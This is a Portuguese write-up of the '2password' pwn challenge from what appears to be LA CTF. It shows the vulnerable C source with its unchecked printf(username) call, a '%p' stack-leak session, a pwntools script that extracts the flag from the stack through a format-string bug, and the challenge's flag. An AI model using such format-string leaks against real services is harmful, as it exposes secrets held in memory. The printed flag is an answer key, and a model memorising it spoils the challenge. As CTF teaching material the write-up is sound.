# WriteUp: 2password
## Descrição do Desafio:
**Autor:** kaiphait \
**Categoria:** pwn \
**Descrição:**
> 2Password > 1Password

## Passo a Passo da Solução
### 1. Análise dos arquivos fornecidos
Este desafio fornece tanto o executável como o código-fonte dele. Olhando para o código fonte, notamos que é um código simples, ele apenas pede para inserirmos um usuário, uma senha 1, e por fim uma senha 2, sem nenhuma possibilidade de *overflow*.

Também notamos que a **flag** não é impressa na tela em nenhum momento, porém, há uma verificação entre o conteúdo dela e a senha 2.

{% code title="chall.c" overflow="wrap" numberLines="true" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void readline(char *buf, size_t size, FILE *file) {
  if (!fgets(buf, size, file)) {
    puts("wtf");
    exit(1);
  }
  char *end = strchr(buf, '\n');
  if (end) {
    *end = '\0';
  }
}

int main(void) {
  setbuf(stdout, NULL);
  printf("Enter username: ");
  char username[42];
  readline(username, sizeof username, stdin);
  printf("Enter password1: ");
  char password1[42];
  readline(password1, sizeof password1, stdin);
  printf("Enter password2: ");
  char password2[42];
  readline(password2, sizeof password2, stdin);
  FILE *flag_file = fopen("flag.txt", "r");
  if (!flag_file) {
    puts("can't open flag");
    exit(1);
  }
  char flag[42];
  readline(flag, sizeof flag, flag_file);
  if (strcmp(username, "kaiphait") == 0 &&
      strcmp(password1, "correct horse battery staple") == 0 &&
      strcmp(password2, flag) == 0) {
    puts("Access granted");
  } else {
    printf("Incorrect password for user ");
    printf(username);
    printf("\n");
  }
}
```

{% endcode %}

O interessante desse código, é que no final dele, caso uma das verificações de usuário e senha tenha falhado, é impresso o `username` por meio da função `printf(username)`. E isso é uma vulnerabilidade de *format string*, porque dessa forma nós podemos inserir formatos na variável do usuário que imprimirão o conteúdo da pilha, e como o conteúdo da **flag** é carregado para uma variável local antes da verificação, ela estará na pilha.

### 2. Exploit
A solução é bem simples, devemos encontrar a posição na qual a **flag** começa a aparecer na pilha e com isso vazar seu conteúdo. Executando o código, e digitando vários caracteres de formato, encontramos a **flag** na posição 6 da pilha.

{% hint style="info" %}

**Nota:** No meu caso, o arquivo **flag.txt** contém o valor `ABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBA`, por isso que a saída na pilha é um monte de `0x42` e `0x41`.

{% endhint %}

```bash
Enter username: %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
Enter password1: NADA
Enter password2: NADA
Incorrect password for user 0x7ffc38b83a20-(nil)-(nil)-0x1c-(nil)-0x4242424242424241-0x4242424242424242-0x4242424242424242-0x4242424242424242-0x4242424242424242-0x1800041
```

{% code title="solve.py" overflow="wrap" numberLines="true" %}

```py
from pwn import *

elf = context.binary = ELF("./chall")
p = remote("ip", porta)
#p = process()

# Montando payload, flag começa no 6.
payload = ""
for i in range(6, 9):
    payload += f"%{i}$p-"
payload = payload.encode()

# Enviando payload.
p.sendlineafter(b"username:", payload)
p.sendlineafter(b"password1:", b"CCCCCCCC")
p.sendlineafter(b"password2:", b"CCCCCCCC")

# Montando a flag.
p.recvuntil(b"user")
flag = ""
flag_leak = p.recvline().decode().split("-")[:-1]

flag = b''.join(
    int(x.strip(), 16).to_bytes((len(x.strip()) - 2 + 1) // 2, 'little')
    for x in flag_leak
).decode(errors='ignore')

print(flag)
```

{% endcode %}

{% hint style="info" %}

**Nota:** O valor 9 na instrução `range(6, 9)` foi encontrado depois de vazar a **flag** pela primeira vez, inicialmente o valor era 11, já que no código-fonte a **flag** era carregada para uma *string* de 42 caracteres.

{% endhint %}

### Flag
`lactf{hunter2_cfc0xz68}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)